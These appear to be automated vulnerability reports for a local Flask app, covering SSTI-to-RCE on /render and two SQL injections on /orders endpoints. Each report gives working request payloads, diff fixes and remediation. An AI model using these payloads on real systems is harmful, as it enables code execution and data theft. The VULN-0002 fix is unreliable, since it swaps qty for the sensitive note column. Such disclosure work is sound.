╭─ VULN-0001 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: Server-Side Template Injection (SSTI) leading to RCE in /render      │
│                                                                              │
│  Severity: CRITICAL                                                          │
│                                                                              │
│  CVSS Score: 9.8                                                             │
│                                                                              │
│  Target: http://127.0.0.1:8098/render                                        │
│                                                                              │
│  Endpoint: /render                                                           │
│                                                                              │
│  Method: POST                                                                │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H                            │
│                                                                              │
│  Description                                                                 │
│  Server-Side Template Injection (SSTI) in the `/render` endpoint allows      │
│  unauthenticated remote code execution via the `tpl` form parameter.         │
│                                                                              │
│  Impact                                                                      │
│  Arbitrary remote code execution on the server hosting the Flask             │
│  application, leading to full system compromise.                             │
│                                                                              │
│  Technical Analysis                                                          │
│  The `/render` endpoint retrieves the `tpl` form parameter without any       │
│  validation or sanitization and passes it directly to Flask's                │
│  `render_template_string()`. Since Jinja2 evaluates expressions within `{{   │
│  }}`, an attacker can traverse the object graph via                          │
│  `config.__class__.__init__.__globals__` to access Python builtins or        │
│  modules like `os`, enabling arbitrary command execution.                    │
│                                                                              │
│  PoC Description                                                             │
│  1. Send a POST request to `/render` with the form parameter                 │
│  `tpl={{config.__class__.__init__.__globals__['os'].popen('id').read()}}`.\  │
│  n2. Observe command execution output in the HTTP response.                  │
│                                                                              │
│  PoC Code                                                                    │
│  import requests                                                             │
│                                                                              │
│  resp = requests.post("http://127.0.0.1:8098/render", data={"tpl":           │
│  "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"})      │
│  print(resp.text)                                                            │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: app.py:47-52                                                  │
│    Sanitize or use safe template rendering                                   │
│    Fix:                                                                      │
│    - @app.route(\"/render\", methods=[\"POST\"])\ndef render():\n    # (3)   │
│  SSTI via a POST form field (not a query string)\n    tpl =                  │
│  request.form.get(\"tpl\", \"hello\")\n    return                            │
│  render_template_string(tpl)                                                 │
│    + @app.route(\"/render\", methods=[\"POST\"])\ndef render():\n    #       │
│  Secure: pass template input as context variables instead of evaluating it   │
│  as a template string\n    tpl_name = request.form.get(\"tpl\",              │
│  \"hello\")\n    return render_template_string(\"Hello {{ name }}\",         │
│  name=tpl_name)                                                              │
│                                                                              │
│  Remediation                                                                 │
│  Avoid passing raw user input directly to `render_template_string`.          │
│  Instead, pass user input as context variables to a predefined template      │
│  string or use safe rendering mechanisms.                                    │
│                                                                              │
╰──────────────────────────────────────────────────────────────────────────────╯

╭─ VULN-0002 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: SQL Injection in GET /orders sort parameter                          │
│                                                                              │
│  Severity: HIGH                                                              │
│                                                                              │
│  CVSS Score: 7.5                                                             │
│                                                                              │
│  Target: http://127.0.0.1:8098/orders                                        │
│                                                                              │
│  Endpoint: /orders                                                           │
│                                                                              │
│  Method: GET                                                                 │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                            │
│                                                                              │
│  Description                                                                 │
│  The GET /orders endpoint directly interpolates the 'sort' query parameter   │
│  into an SQL ORDER BY clause without sanitization or parameterization,       │
│  allowing boolean-based blind SQL injection and data exfiltration.           │
│                                                                              │
│  Impact                                                                      │
│  Allows an attacker to infer sensitive database contents (such as flags and  │
│  notes) using boolean-based blind SQL injection.                             │
│                                                                              │
│  Technical Analysis                                                          │
│  The application takes request.args.get("sort") and interpolates it          │
│  directly into an f-string for the ORDER BY clause. Since SQL                │
│  parameterization cannot be used for column names or clauses, an allowlist   │
│  must be enforced.                                                           │
│                                                                              │
│  PoC Description                                                             │
│  1. Send GET request to /orders with a sort parameter containing a           │
│  conditional CASE statement.                                                 │
│  2. Observe different result rows ordering based on the boolean condition.   │
│                                                                              │
│  PoC Code                                                                    │
│  import requests                                                             │
│  r = requests.get('http://127.0.0.1:8098/orders', params={'sort':'(CASE      │
│  WHEN (substr((SELECT note FROM orders WHERE id=1),1,1)=\\'f\\') THEN id     │
│  ELSE qty END)'})                                                            │
│  print(r.text)                                                               │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: app.py:23-27                                                  │
│    Allowlist sort parameter                                                  │
│    Fix:                                                                      │
│    -     sort = request.args.get(\"sort\", \"id\")                           │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f\"SELECT id, sku, qty FROM orders ORDER BY         │
│  {sort}\").fetchall()                                                        │
│    +     sort = request.args.get(\"sort\", \"id\")                           │
│      if sort not in [\"id\", \"sku\", \"qty\"]:                              │
│          sort = \"id\"                                                       │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f\"SELECT id, sku, note FROM orders ORDER BY        │
│  {sort}\").fetchall()                                                        │
│                                                                              │
│  Remediation                                                                 │
│  Restrict the 'sort' parameter to a hardcoded allowlist of permitted column  │
│  names.                                                                      │
│                                                                              │
╰──────────────────────────────────────────────────────────────────────────────╯

╭─ VULN-0003 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: SQL Injection in POST /orders/by-sku sku parameter                   │
│                                                                              │
│  Severity: CRITICAL                                                          │
│                                                                              │
│  CVSS Score: 9.1                                                             │
│                                                                              │
│  Target: http://127.0.0.1:8098/orders/by-sku                                 │
│                                                                              │
│  Endpoint: /orders/by-sku                                                    │
│                                                                              │
│  Method: POST                                                                │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N                            │
│                                                                              │
│  Description                                                                 │
│  The POST /orders/by-sku endpoint directly interpolates the JSON 'sku'       │
│  parameter into an SQL WHERE clause without parameterization, enabling SQL   │
│  injection and full data exfiltration.                                       │
│                                                                              │
│  Impact                                                                      │
│  Allows unauthorized extraction of all database records, including           │
│  sensitive notes and flags.                                                  │
│                                                                              │
│  Technical Analysis                                                          │
│  The endpoint formats the `sku` variable directly into an SQL query string,  │
│  allowing breakout from the single quotes and injection of arbitrary SQL     │
│  statements.                                                                 │
│                                                                              │
│  PoC Description                                                             │
│  1. Send POST request to /orders/by-sku with JSON body `{"sku": "' OR 1=1    │
│  --"}`.                                                                      │
│  2. Observe all records returned in the response.                            │
│                                                                              │
│  PoC Code                                                                    │
│  import requests                                                             │
│  r = requests.post('http://127.0.0.1:8098/orders/by-sku', json={'sku': \"'   │
│  OR 1=1 --\"})                                                               │
│  print(r.text)                                                               │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: app.py:31-35                                                  │
│    Use parameterized query for sku                                           │
│    Fix:                                                                      │
│    -     body = request.get_json(force=True, silent=True) or {}              │
│      sku = body.get(\"sku\", \"alpha\")                                      │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f\"SELECT id, sku, note FROM orders WHERE sku =     │
│  '{sku}'\").fetchall()                                                       │
│    +     body = request.get_json(force=True, silent=True) or {}              │
│      sku = body.get(\"sku\", \"alpha\")                                      │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(\"SELECT id, sku, note FROM orders WHERE sku =      │
│  ?\", (sku,)).fetchall()                                                     │
│                                                                              │
│  Remediation                                                                 │
│  Use parameterized SQL queries instead of string formatting for user         │
│  inputs.                                                                     │
│                                                                              │
╰──────────────────────────────────────────────────────────────────────────────╯

